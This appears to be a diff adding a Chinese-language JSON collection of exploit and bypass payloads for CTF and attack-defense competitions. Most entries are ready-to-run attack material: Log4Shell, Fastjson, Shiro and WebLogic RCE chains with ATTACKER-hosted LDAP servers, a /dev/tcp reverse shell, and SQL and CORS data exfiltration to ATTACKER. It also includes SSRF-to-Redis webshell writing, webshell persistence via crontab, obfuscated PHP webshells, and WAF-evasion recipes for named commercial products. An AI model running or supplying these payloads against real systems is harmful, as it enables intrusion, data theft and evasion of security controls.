+   "body": "# 1) 探测\ncurl -i http://TARGET/ -H 'Cookie: rememberMe=1' | grep -i rememberMe\n# 2) 爆破密钥\npython3 shiro_exploit.py -u http://TARGET/ -k\n# 3) 利用\njava -jar ysoserial.jar CommonsBeanutils1 'bash -c {echo,BASE64}|{base64,-d}|bash' > p.bin\npython3 shiro_exploit.py -u http://TARGET/ -g CommonsBeanutils1 -c 'id'\n# 4) 内存马（不回显场景）\njava -jar shiro_attack.jar"
+  },
+  {
+   "id": "exploit-java-weblogic",
+   "title": "WebLogic 常见漏洞链",
+   "language": "java",
+   "description": "T3/IIOP 反序列化 + 控制台弱口令，靶场常考。",
+   "body": "# T3 反序列化（CVE-2015-4852 / 2017-3248 / 2018-2628）\npython3 weblogic_t3.py -t TARGET -p 7001 --cmd id\n# 控制台弱口令 → 部署 war\nhttp://TARGET:7001/console  weblogic/weblogic\n# XMLDecoder（CVE-2017-3506）\nPOST /wls-wsat/CoordinatorPortType\n# IIOP（CVE-2020-2551）\njava -jar ysoserial.jar ... "
+  },
+  {
+   "id": "exploit-java-fastjson-rce",
+   "title": "Fastjson 1.2.47 通杀链",
+   "language": "java",
+   "description": "无需 autoType，缓存类绕过；先把 dnslog 打出去确认。",
+   "body": "{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\n \"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://ATTACKER:1389/Exploit\",\"autoCommit\":true}}\n# 起 LDAP 服务\njava -jar JNDIExploit-1.4-SNAPSHOT.jar -i ATTACKER -p 8888"
+  },
+  {
+   "id": "exploit-java-log4shell",
+   "title": "Log4Shell 快速验证与利用",
+   "language": "java",
+   "description": "先用 DNS 确认出网，再上 LDAP 加载。",
+   "body": "curl http://TARGET/ -H 'User-Agent: ${jndi:ldap://ATTACKER:1389/a}'\n# 确认后\njava -jar JNDIExploit.jar -i ATTACKER -p 8888\n# 无回显用 TomcatEcho\n${jndi:ldap://ATTACKER:1389/TomcatBypass/TomcatEcho}"
+  },
+  {
+   "id": "exploit-java-actuator-rce",
+   "title": "Spring Actuator Gateway SpEL RCE",
+   "language": "java",
+   "description": "有 /actuator/gateway 且可写路由时，直接注入 SpEL 执行。",
+   "body": "POST /actuator/gateway/routes/x\n{\"id\":\"x\",\"filters\":[{\"name\":\"AddResponseHeader\",\"args\":{\"name\":\"r\",\"value\":\"#{new String(T(java.lang.Runtime).getRuntime().exec('id').getInputStream().readAllBytes())}\"}}],\"uri\":\"http://example.com\",\"order\":0}\nPOST /actuator/gateway/refresh\nGET /actuator/gateway/routes/x"
+  },
+  {
+   "id": "exploit-java-xxe-read",
+   "title": "Java XXE 读文件 / 打内网",
+   "language": "java",
+   "description": "解析器允许 DTD 时优先读配置，其次 SSRF 打内网。",
+   "body": "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>\n# SSRF\n<!DOCTYPE r [<!ENTITY x SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><r>&x;</r>\n# 打内网端口探测\n<!ENTITY x SYSTEM \"http://127.0.0.1:6379/\">"
+  },
+  {
+   "id": "exploit-multi-reverse-tls",
+   "title": "反弹 shell: 加密与端口复用",
+   "language": "shell",
+   "description": "出网只放 443 或做了深度检测时，用 TLS 与常见端口。",
+   "body": "# TLS 反弹\nopenssl s_server -quiet -accept 443 -cert c.pem -key k.pem\nbash -c 'exec 5<>/dev/tcp/ATTACKER/443;cat <&5|while read l;do $l 2>&5;done'\n# 走 53\nnc -u ATTACKER 53\n# 走 http 隧道\n# 用 chisel / frp / socat"
+  },
+  {
+   "id": "exploit-multi-privesc-linux",
+   "title": "Linux 提权快速检查",
+   "language": "shell",
+   "description": "拿 shell 后 5 分钟内跑完的检查清单。",
+   "body": "id; sudo -l; uname -a; cat /etc/os-release\nfind / -perm -4000 -type f 2>/dev/null\ngetcap -r / 2>/dev/null\ncrontab -l; ls -la /etc/cron*\ncat /etc/passwd | grep -v nologin\nls -la /root /home 2>/dev/null\nenv; cat ~/.bash_history\n# 一键\n./linpeas.sh | tee /tmp/lp.txt"
+  },
+  {
+   "id": "exploit-multi-privesc-win",
+   "title": "Windows 提权快速检查",
+   "language": "shell",
+   "description": "AWD 的 Windows 靶机通常是低权 Web 用户，先看服务与计划任务。",
+   "body": "whoami /priv\nsysteminfo | findstr /B /C:\"OS Name\" /C:\"Hotfix\"\nwmic service get name,pathname,startmode | findstr /i auto\nschtasks /query /fo LIST /v\nicacls C:\\inetpub\\wwwroot\n# 一键\nwinPEASx64.exe"
+  },
+  {
+   "id": "exploit-multi-db-tunnel",
+   "title": "数据库外带与隧道",
+   "language": "shell",
+   "description": "只有数据库权限时，用 SQL 把数据带出来。",
+   "body": "# MySQL 写文件外带\nselect ... into outfile '/var/www/html/o.txt';\n# DNS 外带（需出网）\nselect load_file(concat('\\\\\\\\',(select password from users limit 1),'.ATTACKER\\\\a'));\n# PG\ncopy (select ...) to program 'curl -d @- http://ATTACKER/';"
+  },
+  {
+   "id": "exploit-multi-upload-to-shell",
+   "title": "上传点 → shell 的完整判定流程",
+   "language": "mixed",
+   "description": "上传后先确认落地路径与解析规则，再决定用 .htaccess 还是双扩展。",
+   "body": "# 1) 找落地路径（响应里常回显 /uploads/xxx.png）\n# 2) 确认是否解析（访问看是否执行）\n# 3) 不解析 → 试 .htaccess / .user.ini / 双扩展 / 大小写\n# 4) 有过滤 → 图片马 + 包含，或 zip/phar 包装\n# 5) 落地即执行 → 直接 eval 马"
+  },
+  {
+   "id": "exploit-multi-ssrf-to-redis",
+   "title": "SSRF → Redis 写 shell 全流程",
+   "language": "mixed",
+   "description": "gopher 报文生成 + 写文件 + 验证，一条链打通。",
+   "body": "python3 gopherus.py --exploit redis\n# 手工报文（注意 Redis 内联命令用 \\r\\n）\ngopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2434%0D%0A%0A%0A%3C%3Fphp%20eval(%24_POST%5B1%5D)%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%245%0D%0Ax.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A"
+  },
+  {
+   "id": "exploit-multi-jwt-forge",
+   "title": "JWT 伪造一条命令",
+   "language": "mixed",
+   "description": "知道密钥或能改 alg 时，直接生成管理员 token。",
+   "body": "python3 jwt_tool.py <JWT> -T\npython3 jwt_tool.py <JWT> -X a        # alg:none\npython3 jwt_tool.py <JWT> -X k -pk pub.pem   # 算法混淆\npython3 -c \"import jwt;print(jwt.encode({'user':'admin','role':'admin'},'secret',algorithm='HS256'))\"\n# 生成 JWKS 打 jku\npython3 jwt_tool.py <JWT> -X s -ju http://ATTACKER/jwks.json"
+  },
+  {
+   "id": "exploit-multi-cors-leak",
+   "title": "CORS 配置错误偷数据",
+   "language": "mixed",
+   "description": "Access-Control-Allow-Origin 反射 + Allow-Credentials 时可直接读跨域响应。",
+   "body": "<script>\nfetch('https://api.target/userinfo',{credentials:'include'})\n .then(r=>r.text()).then(t=>location='http://ATTACKER/?d='+btoa(t))\n</script>\n# 探测\ncurl -i https://api.target/ -H 'Origin: https://evil.com' | grep -i access-control"
+  },
+  {
+   "id": "exploit-multi-idor",
+   "title": "越权 / IDOR 批量验证",
+   "language": "mixed",
+   "description": "换 id、换 header、换方法，三个维度扫一遍。",
+   "body": "# 1) 改 id\nfor i in $(seq 1 50); do curl -s \"http://TARGET/api/user/$i\" -H \"Cookie: $C\" | head -c 80; echo; done\n# 2) 换身份头\nX-Forwarded-For: 127.0.0.1\nX-Original-URL: /admin\nX-Rewrite-URL: /admin\n# 3) 改方法\nGET → POST → PUT → DELETE → PATCH\n# 4) 加参数\n?role=admin  &is_admin=1  &user_id=1"
+  },
+  {
+   "id": "exploit-multi-webshell-upload",
+   "title": "Webshell 落地后稳定性处理",
+   "language": "mixed",
+   "description": "AWD 里 shell 会被对面清掉，做双通道 + 隐藏路径。",
+   "body": "# 1) 两个不同路径的马\n/upload/.a.php   /static/img/.b.php\n# 2) 隐藏文件名\n.htaccess 里加 AddType，马改名成 .jpg\n# 3) 备用通道\n写 crontab 每分钟拉一次\n# 4) 检测对面清理\nwhile true; do curl -s -o /dev/null -w '%{http_code}' http://TARGET/x.php; sleep 30; done"
+  },
+  {
+   "id": "exploit-multi-flag-score",
+   "title": "AWD 抢 flag 的自动化骨架",
+   "language": "mixed",
+   "description": "比赛里 flag 轮换，写个循环定时读并提交（仅用于授权比赛）。",
+   "body": "while true; do\n  f=$(curl -s \"http://TARGET/?file=/flag\" | grep -oE '[A-Za-z0-9_]{8,}\\{[^}]+\\}')\n  [ -n \"$f\" ] && curl -s \"http://FLAG_SUBMIT/api/flag\" -d \"flag=$f&token=$TOKEN\"\n  sleep 60\ndone"
+  }
+ ],
+ "bypasses": [
+  {
+   "id": "bypass-sqli-keyword",
+   "title": "SQL 注入: 关键字碎片化",
+   "target": "sqli",
+   "description": "针对 union/select/where 黑名单。",
+   "body": "大小写混淆: SeLeCt / UnIoN\n注释穿插: uni/**/on/**/sel/**/ect\n换行拆分: union%0aselect\n函数替换: updatexml / extractvalue / json_keys"
+  },
+  {
+   "id": "bypass-sqli-encoding",
+   "title": "SQL 注入: 编码 / 引号绕过",
+   "target": "sqli",
+   "description": "针对单双引号和关键词过滤。",
+   "body": "十六进制: 0x61646d696e\nXML 实体: &#x55;&#x4e;&#x49;&#x4f;&#x4e;\n反斜杠逃逸: username=\\\\&password= or 1=1--\n宽字节: %df%27"
+  },
+  {
+   "id": "bypass-rce-space",
+   "title": "命令执行: 空格与分隔符绕过",
+   "target": "rce",
+   "description": "针对空格、分号和管道过滤。",
+   "body": "空格替换: $IFS / ${IFS} / %09\n换行: %0aid\n逻辑运算: &&id / ||id\n括号子命令: $(id) / `id`"
+  },
+  {
+   "id": "bypass-rce-char",
+   "title": "命令执行: 字符拆分与编码",
+   "target": "rce",
+   "description": "针对 cat/bash/sh 等敏感词过滤。",
+   "body": "命令拆分: c''at / b''ash\n变量拼接: a=ca;b=t;$a$b /flag\nprintf/base64: $(printf Y2F0IC9mbGFn|base64 -d)\n环境变量: ${PATH:0:1}bin${PATH:0:1}sh"
+  },
+  {
+   "id": "bypass-xss-encoding",
+   "title": "XSS: 标签和编码绕过",
+   "target": "xss",
+   "description": "针对 script、onerror 关键字拦截。",
+   "body": "<svg/onload=alert(1)>\n<ScRiPt>alert(1)</ScRiPt>\n&#x3c;img src=x onerror=alert(1)&#x3e;\n<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>"
+  },
+  {
+   "id": "bypass-ssti-quotefree",
+   "title": "SSTI: 无引号与属性访问绕过",
+   "target": "ssti",
+   "description": "针对引号、点号、下划线过滤。",
+   "body": "Jinja2: {{request|attr('application')}}\nJinja2 无引号: {{obj.__dict__.update(x=value) or obj.x}}\nTwig: {{['id']|map('system')|join}}\nSpEL: ${T(java.lang.Runtime).getRuntime()}"
+  },
+  {
+   "id": "bypass-ssrf-host",
+   "title": "SSRF: 主机表示法绕过",
+   "target": "ssrf",
+   "description": "针对 localhost / 127.0.0.1 黑名单。",
+   "body": "127.1\n2130706433\n0x7f000001\n[::1]\n127.0.0.1.nip.io\nhttp://user@127.0.0.1/"
+  },
+  {
+   "id": "bypass-ssrf-redirect",
+   "title": "SSRF: 跳转与协议绕过",
+   "target": "ssrf",
+   "description": "针对协议白名单和二次请求逻辑。",
+   "body": "开放重定向跳内网\nDNS rebinding\nfile:// / dict:// / gopher://\nHost 头拼接 SSRF"
+  },
+  {
+   "id": "bypass-upload-ext",
+   "title": "文件上传: 扩展名绕过",
+   "target": "upload",
+   "description": "针对后缀和 mime 检测。",
+   "body": "双后缀: shell.php.jpg\n大小写: shell.pHp\n替代扩展: .phtml / .phar / .php5\n空字节老题: shell.php%00.jpg"
+  },
+  {
+   "id": "bypass-upload-content",
+   "title": "文件上传: 内容绕过",
+   "target": "upload",
+   "description": "针对魔数和图片校验。",
+   "body": "polyglot: GIF89a<?php ... ?>\nEXIF 注入\nZIP 套娃 / 图片马\n.htaccess 指向自定义解析"
+  },
+  {
+   "id": "bypass-lfi-traversal",
+   "title": "路径穿越: 编码与分隔符绕过",
+   "target": "lfi",
+   "description": "针对 ../、/、\\ 过滤。",
+   "body": "....//....//flag\n..%2f..%2f..%2fflag\n%252e%252e%252f\n..\\\\..\\\\flag\n{.}{.}/flag"
+  },
+  {
+   "id": "bypass-xxe-dtd",
+   "title": "XXE: 外部 DTD 与参数实体",
+   "target": "xxe",
+   "description": "针对普通实体被禁用的 XML 解析器。",
+   "body": "<!ENTITY % ext SYSTEM \"http://ATTACKER/dtd\"> %ext;\n参数实体套娃\nphp://filter/base64-encode/resource=/flag"
+  },
+  {
+   "id": "bypass-deser-wrapper",
+   "title": "反序列化: 包装层绕过",
+   "target": "deserialization",
+   "description": "针对 cookie/base64/gzip/URL 编码包裹。",
+   "body": "base64(serialized)\nURL encode 后再 base64\ngzip + base64\ncookie 名旁路: rememberMe / profile / prefs"
+  },
+  {
+   "id": "bypass-proto-alt",
+   "title": "原型污染: 替代键名",
+   "target": "prototype-pollution",
+   "description": "针对只过滤 __proto__ 的场景。",
+   "body": "constructor.prototype.isAdmin=true\nprototype.debug=true\nJSON merge / clone / defaultsDeep 链"
+  },
+  {
+   "id": "bypass-jwt-header",
+   "title": "JWT: 头部字段绕过",
+   "target": "jwt",
+   "description": "针对签名校验薄弱和 key 选择缺陷。",
+   "body": "alg=none\nkid=../../../dev/null\njku 指向自建 JWKS\njwk 内联公钥"
+  },
+  {
+   "id": "bypass-auth-proxy",
+   "title": "认证绕过: 代理与路由头",
+   "target": "auth-bypass",
+   "description": "针对前置代理、内部路由或调试入口。",
+   "body": "X-Forwarded-For: 127.0.0.1\nX-Original-URL: /admin\nX-Rewrite-URL: /internal\nHost: 127.0.0.1"
+  },
+  {
+   "id": "bypass-nosqli-operators",
+   "title": "NoSQL 注入: 操作符绕过",
+   "target": "nosqli",
+   "description": "针对只过滤字符串关键字的 JSON 解析链。",
+   "body": "{\"username\":{\"$regex\":\".*\"},\"password\":{\"$regex\":\".*\"}}\n{\"$where\":\"return true\"}\n{\"username\":{\"$gt\":\"\"}}"
+  },
+  {
+   "id": "bypass-jwt-confusion",
+   "title": "JWT: 算法混淆与密钥选择",
+   "target": "jwt",
+   "description": "适合 HS/RS 混淆和 kid 文件读取。",
+   "body": "RS256 -> HS256 confusion\nkid=../../../../proc/self/environ\nkid=|/app/public.pem\njku/jwk 指向自控密钥集"
+  },
+  {
+   "id": "bypass-auth-method-override",
+   "title": "认证绕过: Method Override",
+   "target": "auth-bypass",
+   "description": "适合 Nginx / API Gateway / Spring 前置规则不一致。",
+   "body": "X-HTTP-Method-Override: PUT\nX-Original-Method: GET\nX-Rewrite-URL: /admin\nX-Forwarded-Prefix: /internal"
+  },
+  {
+   "id": "bypass-archive-slip-normalize",
+   "title": "Archive Slip: 正规化绕过",
+   "target": "archive-slip",
+   "description": "针对只过滤 ../ 或只 clean 一次的解包逻辑。",
+   "body": "..%2f..%2f..%2fwebapps/ROOT/shell.jsp\n..../..../webapps/ROOT/shell.jsp\n..\\..\\..\\..\\inetpub\\wwwroot\\shell.aspx"
+  },
+  {
+   "id": "bypass-xxe-svg-shell",
+   "title": "XXE: SVG / Office 外壳",
+   "target": "xxe",
+   "description": "针对接口不直接叫 XML 但会解析结构化文件。",
+   "body": "image/svg+xml with <!DOCTYPE svg>\nDOCX / XLSX customXml\nSOAP Envelope + external entity"
+  },
+  {
+   "id": "bypass-lfi-wrapper-chain",
+   "title": "LFI: Wrapper 链与截断",
+   "target": "lfi",
+   "description": "适合只拦 ../ 但没处理 wrapper 的场景。",
+   "body": "php://filter/read=convert.base64-encode/resource=index.php\ndata://text/plain,<?php system($_GET[x]);?>\nzip://shell.jpg%23payload.php"
+  },
+  {
+   "id": "bypass-upload-parser-gap",
+   "title": "上传: 解析链差异绕过",
+   "target": "upload",
+   "description": "针对应用层、代理层、解释器层校验不一致。",
+   "body": "Content-Type:image/gif + .php5\nNginx/Apache 双扩展解析差异\n大小写后缀 + 反向代理缓存命中"
+  },
+  {
+   "id": "bypass-rce-env-expand",
+   "title": "命令执行: 环境变量与通配符",
+   "target": "rce",
+   "description": "针对 system/exec 关键字和命令黑名单。",
+   "body": "${PATH:0:1}bin${PATH:0:1}sh\n/???/??t /???/p??s?\n${IFS}ca${IFS}t${IFS}/flag"
+  },
+  {
+   "id": "bypass-waf-cloudflare",
+   "title": "Cloudflare: 常见绕过面",
+   "target": "waf",
+   "description": "CF 主要看路径规范化与源站直连，绕 WAF 不如绕到源站。",
+   "body": "# 1) 找源站（历史 DNS / 证书 / 子域）\ncurl -s https://crt.sh/?q=%25.target.com | grep -oE '[a-z0-9.-]+'\n# 2) 路径大小写与斜杠\n/Admin  /admin/  /./admin  //admin  /%2fadmin\n# 3) 编码\n%252e%252e%252f  %c0%ae%c0%ae%c0%af\n# 4) 头部\nX-Forwarded-For: 127.0.0.1\nX-Real-IP: 127.0.0.1\nCF-Connecting-IP: 127.0.0.1\n# 5) 分块传输绕 body 检测\nTransfer-Encoding: chunked"
+  },
+  {
+   "id": "bypass-waf-aws",
+   "title": "AWS WAF: 规则集绕过思路",
+   "target": "waf",
+   "description": "AWS WAF 的 managed rules 对大小写、注释、编码的覆盖有限。",
+   "body": "# 1) 大小写 / 注释\nSeLeCt 1 /*!50000union*/\n# 2) JSON body 逃逸（只检 form 时）\nContent-Type: application/json\n{\"q\":\"1' or 1=1-- \"}\n# 3) 参数污染\n?id=1&id=1' or 1=1--\n# 4) 超长 body 触发 size 限制（部分规则跳过）\n# 5) Unicode 归一化差异\n%ef%bc%87  （全角）"
+  },
+  {
+   "id": "bypass-waf-modsec-crs",
+   "title": "ModSecurity CRS: 规则绕过",
+   "target": "waf",
+   "description": "CRS 的 paranoia level 决定严格度；低 PL 时注释与等价语法基本都能过。",
+   "body": "# 1) 注释分割关键字\nunion/**/select  /*!50000select*/\n# 2) 参数名混淆（CRS 按参数名打分）\n?1' or 1=1-- =x\n# 3) 分块 + 延迟（绕 payload 拼接检测）\n# 4) 换行代替空格\nunion%0aselect%0a1,2,3\n# 5) 双写\nununionion seselectlect\n# 6) 检查 PL 级别\n?x=<script>alert(1)</script>  → 被拦说明 PL>=1"
+  },
+  {
+   "id": "bypass-waf-safedog",
+   "title": "安全狗: 绕过要点",
+   "target": "waf",
+   "description": "安全狗对关键字与 union/select 组合最敏感，对编码与内联注释较松。",
+   "body": "/*!50000union*/ /*!50000select*/ 1,2,3\nunion%23%0aselect 1,2,3\n# 空格\n%09 %0a %0c /**/\n# 关键字\nselselectect  （双写）\n# 函数替换\nmid() 代替 substr()\n# 文件包含\n?file=../../../../etc/passwd  →  ..%2f..%2f..%2f..%2fetc%2fpasswd"
+  },
+  {
+   "id": "bypass-waf-dshield",
+   "title": "D 盾: 绕过要点",
+   "target": "waf",
+   "description": "D 盾对 eval/assert/$_POST 组合敏感，对编码与变量函数较松。",
+   "body": "<?php $a=$_REQUEST['a'];$b='ass'.'ert';$b($a);?>\n<?php $_u=$_POST;@$u[0]($_u[1]);?>\n<?php call_user_func('assert',$_POST[1]);?>\n# 关键字拆分\n$a='sys';$b='tem';$a.$b('id');\n# base64\neval(base64_decode($_POST[1]));"
+  },
+  {
+   "id": "bypass-waf-bt",
+   "title": "宝塔 WAF: 绕过要点",
+   "target": "waf",
+   "description": "宝塔 WAF 基于正则 + 语义，对 header 注入与编码绕过防护较弱。",
+   "body": "# 1) 参数走 header\nX-Forwarded-Host: 1' or 1=1--\n# 2) Cookie 传参\nCookie: q=1' or 1=1--\n# 3) 分块传输\nTransfer-Encoding: chunked\n# 4) 大包（超 8MB 可能跳过检测）\n# 5) 上传点用 multipart 边界混淆"
+  },
+  {
+   "id": "bypass-waf-yunsuo",
+   "title": "云锁: 绕过要点",
+   "target": "waf",
+   "description": "云锁偏主机层，重点看命令执行与文件写入，Web 层正则相对薄。",
+   "body": "# 命令执行\na=c;b=at;$a$b /etc/passwd\n$(printf 'cat') /etc/passwd\n/???/??t /etc/passwd\n# 文件写入\nfile_put_contents('/tmp/x.php',base64_decode($_POST[1]));\n# 编码\necho ZWNobyBpZA==|base64 -d|sh"
+  },
+  {
+   "id": "bypass-waf-leichi",
+   "title": "雷池 / 长亭: 绕过要点",
+   "target": "waf",
+   "description": "语义引擎强，靠语法变形难绕；改走业务逻辑与协议层。",
+   "body": "# 1) 语义难绕 → 换入口\n# 2) HTTP/2 伪头与路径规范化差异\n# 3) 请求走私（CL.TE）\n# 4) 参数污染\n# 5) 上传 + 包含组合（单点都合法）"
+  },
+  {
+   "id": "bypass-waf-json-body",
+   "title": "WAF: Content-Type 切换绕过",
+   "target": "waf",
+   "description": "很多 WAF 只解析 form 或只解析 json，切换类型就能把 payload 送进去。",
+   "body": "Content-Type: application/json      →  {\"q\":\"1' or 1=1-- \"}\nContent-Type: text/plain            →  1' or 1=1-- \nContent-Type: application/xml       →  <q>1' or 1=1-- </q>\nContent-Type: multipart/form-data   →  分片放 payload\n# 同时发两份，看后端取哪个\n?q=safe  +  body q=1' or 1=1-- "
+  },
+  {
+   "id": "bypass-waf-chunked",
+   "title": "WAF: 分块传输与请求拆分",
+   "target": "waf",
+   "description": "分块让 WAF 无法拼出完整 payload，后端仍会拼回去。",
+   "body": "POST / HTTP/1.1\nTransfer-Encoding: chunked\nContent-Type: application/x-www-form-urlencoded\n\n4\nq=1'\n9\n+or+1=1--\n0\n\n# 变体：CL+TE 同时给\nContent-Length: 6\nTransfer-Encoding: chunked"
+  },
+  {
+   "id": "bypass-waf-unicode",
+   "title": "WAF: Unicode / 全角 / 超长编码",
+   "target": "waf",
+   "description": "归一化差异是 WAF 与后端最大的裂缝。",
+   "body": "# 全角\n％２７  ｏｒ  ＝\n# UTF-8 超长编码（老 IIS/Java）\n%c0%a7  %e0%80%a7\n# Unicode 转义\n\\u0027  \\u006f\\u0072\n# 大小写 + 双重编码\n%2527  %252e%252e%252f\n# HTML 实体（XSS）\n&#x27;  &#39;  &apos;"
+  },
+  {
+   "id": "bypass-waf-path",
+   "title": "WAF: 路径规范化绕过",
+   "target": "waf",
+   "description": "WAF 与后端对路径的规范化顺序不同，是绕规则与绕鉴权的高发点。",
+   "body": "/admin  →  /Admin  /ADMIN  /admin/  //admin  /./admin  /admin/.  \n/..;/admin          （Tomcat）\n/admin%20  /admin%09  /admin%00\n/static/../admin\n/%2e/admin\n/admin;jsessionid=1\n# 双写\n/aaadmin  →  /admin（WAF 只替换一次）"
+  },
+  {
+   "id": "bypass-sqli-comment",
+   "title": "SQLi: 注释与内联注释变形",
+   "target": "sqli",
+   "description": "最通用的一类，几乎对所有正则型 WAF 有效。",
+   "body": "union/**/select\nunion/*!50000select*/\n/*!50000union*//*!50000select*/1,2,3\n1/**/or/**/1=1\n1 or/**/1=1\n# 版本注释当关键字\n/*!12345or*/1=1"
+  },
+  {
+   "id": "bypass-sqli-func",
+   "title": "SQLi: 函数等价替换",
+   "target": "sqli",
+   "description": "被拦函数换等价函数，语义不变。",
+   "body": "substr → mid / substring / left / right\nascii → ord / hex\nconcat → concat_ws / group_concat / ||\nsleep → benchmark / heavy query / pg_sleep\nupdatexml → extractvalue / geometrycollection\nload_file → 用 into outfile 反读"
+  },
+  {
+   "id": "bypass-sqli-quote",
+   "title": "SQLi: 引号与字符串构造",
+   "target": "sqli",
+   "description": "引号被转义时用十六进制、char()、或宽字节。",
+   "body": "0x61646d696e\nchar(97,100,109,105,110)\nconcat(char(97),char(100))\n# 宽字节（GBK）\n%df' → %df%5c%27 被吃成 運'\n# 反斜杠逃逸\nadmin\\  →  吃掉转义符"
+  },
+  {
+   "id": "bypass-sqli-noquote",
+   "title": "SQLi: 无引号注入",
+   "target": "sqli",
+   "description": "数字型参数完全不需要引号，很多 WAF 只盯引号。",
+   "body": "?id=1 or 1=1\n?id=1 union select 1,2,3\n?id=1 procedure analyse(extractvalue(1,concat(0x7e,version())),1)"
+  },
+  {
+   "id": "bypass-rce-split",
+   "title": "RCE: 命令拆分与拼接",
+   "target": "rce",
+   "description": "命令关键字被拦时，用变量、通配符、编码还原。",
+   "body": "a=c;b=at;$a$b /etc/passwd\n/???/??t /etc/passwd\nc'a't /etc/passwd\nc\"\"at /etc/passwd\n$(printf 'cat') /etc/passwd\necho Y2F0IC9ldGMvcGFzc3dk|base64 -d|sh"
+  },
+  {
+   "id": "bypass-rce-newline",
+   "title": "RCE: 换行 / 制表 / 变量分隔",
+   "target": "rce",
+   "description": "空格被拦时的全部替代。",
+   "body": "$IFS\n${IFS}\n$IFS$9\n%09\n%0a\n<  （重定向当分隔）\n{cat,/etc/passwd}"
+  },
+  {
+   "id": "bypass-rce-windows",
+   "title": "RCE: Windows 命令拼接",
+   "target": "rce",
+   "description": "Windows 的分隔与转义符与 Linux 不同。",
+   "body": "whoami & dir\nwhoami && dir\nwhoami | dir\nwhoami || dir\nwho^a^m^i\ncmd /c \"whoami\"\npowershell -c \"whoami\"\n%COMSPEC% /c whoami"
+  },
+  {
+   "id": "bypass-xss-tag",
+   "title": "XSS: 标签与属性变形",
+   "target": "xss",
+   "description": "被过滤 script 时换标签，被过滤尖括号时换编码。",
+   "body": "<svg onload=alert(1)>\n<img src=x onerror=alert(1)>\n<details open ontoggle=alert(1)>\n<video><source onerror=alert(1)>\n<a href=javascript:alert(1)>x</a>\n<iframe srcdoc=\"<script>alert(1)</script>\">"
+  },
+  {
+   "id": "bypass-xss-encoding-2",
+   "title": "XSS: 编码与上下文",
+   "target": "xss",
+   "description": "按输出上下文选编码：HTML 实体、JS 十六进制、URL。",
+   "body": "&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;\n\\x3cscript\\x3ealert(1)\\x3c/script\\x3e\n%3Cscript%3Ealert(1)%3C/script%3E\n# 属性内\n\" onmouseover=\"alert(1)\n' onfocus='alert(1)' autofocus='\n# script 内\n</script><svg onload=alert(1)>"
+  },
+  {
+   "id": "bypass-upload-name",
+   "title": "文件上传: 文件名绕过组合",
+   "target": "upload",
+   "description": "文件名、Content-Type、文件头三层独立绕过。",
+   "body": "x.php\nx.php5 x.phtml x.pht x.phar\nx.PHP x.Php\nx.php.jpg x.jpg.php\nx.php%00.jpg\nx.php.  x.php::$DATA\nx.asp;.jpg\n# 双写\nx.pphphp"
+  },
+  {
+   "id": "bypass-upload-header",
+   "title": "文件上传: 内容检测绕过",
+   "target": "upload",
+   "description": "有文件头/内容检测时用图片马或分片拼接。",
+   "body": "GIF89a<?php eval($_POST[1]);?>\n\\xFF\\xD8\\xFF\\xE0<?php eval($_POST[1]);?>\n# 二次渲染绕过（GIF）\n# 分片上传后合并\n# zip/phar 包装\n# 图片 EXIF 写 payload 再包含"
+  },
+  {
+   "id": "bypass-upload-race",
+   "title": "文件上传: 条件竞争",
+   "target": "upload",
+   "description": "先能访问再被删的短暂窗口里执行。",
+   "body": "# 1) 上传并并发访问\nfor i in $(seq 1 200); do curl -s http://TARGET/upload/x.php & done\n# 2) 上传一个会写马的脚本，让它自己落盘\nx.php 内容：<?php file_put_contents('y.php','<?php eval($_POST[1]);?>');?>\n# 3) 利用临时文件 /tmp/phpXXXX"
+  },
+  {
+   "id": "bypass-lfi-dotdot",
+   "title": "LFI: 穿越与编码变体",
+   "target": "lfi",
+   "description": "过滤 ../ 时的等价写法。",
+   "body": "../../../../etc/passwd\n..%2f..%2f..%2f..%2fetc%2fpasswd\n..%252f..%252fetc%252fpasswd\n....//....//etc/passwd\n..\\..\\..\\..\\windows\\win.ini\n%2e%2e%2f%2e%2e%2f\n# 绝对路径直接读\n/etc/passwd"
+  },
+  {
+   "id": "bypass-lfi-wrapper",
+   "title": "LFI: 伪协议绕过扩展名限制",
+   "target": "lfi",
+   "description": "加了 .php 后缀时用伪协议把后缀吃掉。",
+   "body": "php://filter/convert.base64-encode/resource=index\nphp://filter/resource=index.php\ndata://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+\nphar:///upload/x.jpg/a.txt\nzip:///upload/x.zip%23a.txt\ncompress.zlib:///upload/x.gz"
+  },
+  {
+   "id": "bypass-ssrf-host-2",
+   "title": "SSRF: host 校验绕过",
+   "target": "ssrf",
+   "description": "黑名单拦 127.0.0.1 时的等价地址。",
+   "body": "127.0.0.1\nlocalhost\n127.1\n0.0.0.0\n[::1]\n[::ffff:127.0.0.1]\n2130706433\n0x7f000001\n0177.0.0.1\n127.0.0.1.nip.io\nATTACKER#@127.0.0.1\n127.0.0.1@ATTACKER"
+  },
+  {
+   "id": "bypass-ssrf-redirect2",
+   "title": "SSRF: 跳转与 DNS 重绑定",
+   "target": "ssrf",
+   "description": "校验发生在解析前，跳转后不再校验。",
+   "body": "# 302\nhttp://ATTACKER/r?to=http://127.0.0.1:6379\n# DNS 重绑定（ttl=0 先给外网再给内网）\nhttp://rebind.ATTACKER:8080/\n# 短链\nhttp://s.ATTACKER/x"
+  },
+  {
+   "id": "bypass-xxe-filter",
+   "title": "XXE: 关键字过滤绕过",
+   "target": "xxe",
+   "description": "拦 SYSTEM/PUBLIC 时用参数实体与编码。",
